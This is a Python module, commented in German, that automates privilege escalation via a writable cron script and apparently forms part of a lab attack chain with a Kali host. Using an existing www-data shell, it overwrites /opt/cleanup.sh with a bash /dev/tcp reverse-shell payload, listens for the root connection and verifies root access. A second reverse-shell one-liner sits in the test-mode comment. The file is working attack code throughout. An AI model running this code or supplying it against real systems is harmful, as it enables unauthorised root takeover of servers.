import socket
import time

# =============================================================================
# privesc.py — Privilege Escalation via Writable Cron Script
# MITRE ATT&CK: T1053.003 – Cron
# =============================================================================

# Wird später aus config.py importiert mit:
# from config import KALI_IP, PORT_ROOT, CLEANUP_SCRIPT
KALI_IP = "0.0.0.0"
PORT_ROOT = 5555
CLEANUP_SCRIPT = "/opt/cleanup.sh"


def send_command(shell, command):
    """Sendet einen Befehl durch eine aktive Shell-Verbindung."""
    shell.send((command + "\n").encode())
    time.sleep(0.5)


def run(www_shell):
    """
    Führt Privilege Escalation durch.

    Eingabe:  www_shell (socket) — Bash-Verbindung als www-data
              vom vorherigen Schritt übergeben
    Ausgabe:  root_shell (socket) — Bash-Verbindung als root
              wird an nächsten Schritt weitergegeben
    """
    print("\n[*] Starte Privilege Escalation...")

    # Listener VOR dem Überschreiben starten
    # damit Root-Shell nicht verloren geht
    root_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    root_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    root_server.bind((KALI_IP, PORT_ROOT))
    root_server.listen(1)
    print(f"[*] Warte auf Root-Shell auf Port {PORT_ROOT}...")

    # cleanup.sh mit Reverse-Shell-Payload überschreiben
    # > überschreibt, >> hängt an
    print("[*] Überschreibe cleanup.sh...")
    send_command(www_shell, f"echo '#!/bin/bash' > {CLEANUP_SCRIPT}")
    send_command(www_shell, f"echo 'bash -i >& /dev/tcp/kali/{PORT_ROOT} 0>&1' >> {CLEANUP_SCRIPT}")
    print("[+] cleanup.sh erfolgreich überschrieben")
    print("[*] Warte auf Cron-Job (max. 60 Sekunden)...")

    # Cron-Job läuft jede Minute → max. 70 Sekunden warten
    root_server.settimeout(70)

    try:
        root_shell, addr = root_server.accept()
        print(f"[+] Root-Shell erhalten von {addr[0]}")
    except socket.timeout:
        print("[-] Timeout — keine Root-Shell erhalten")
        print("    → Cron-Daemon läuft nicht: service cron status")
        print("    → Cron-Job fehlt: cat /etc/cron.d/cleanup")
        print("    → Dateirechte falsch: ls -la /opt/cleanup.sh")
        return None

    # Root-Rechte bestätigen
    time.sleep(1)
    send_command(root_shell, "id")
    time.sleep(0.5)
    response = root_shell.recv(1024).decode()

    if "uid=0(root)" in response:
        print("[+] Privilege Escalation erfolgreich!")
        print(f"[+] {response.strip()}")
    else:
        print("[-] Root nicht bestätigt")
        print(f"[?] Antwort: {response}")

    return root_shell


# Testmodus — wird nicht ausgeführt wenn von attack.py importiert
# Zum Testen im Apache Container als www-data ausführen:
#   bash -i >& /dev/tcp/kali/4444 0>&1
if __name__ == "__main__":
    print("[*] Testmodus — warte auf www-data Shell auf Port 4444")

    test_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    test_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    test_server.bind(("0.0.0.0", 4444))
    test_server.listen(1)

    www_shell, addr = test_server.accept()
    print(f"[+] www-data Shell erhalten von {addr[0]}")

    run(www_shell)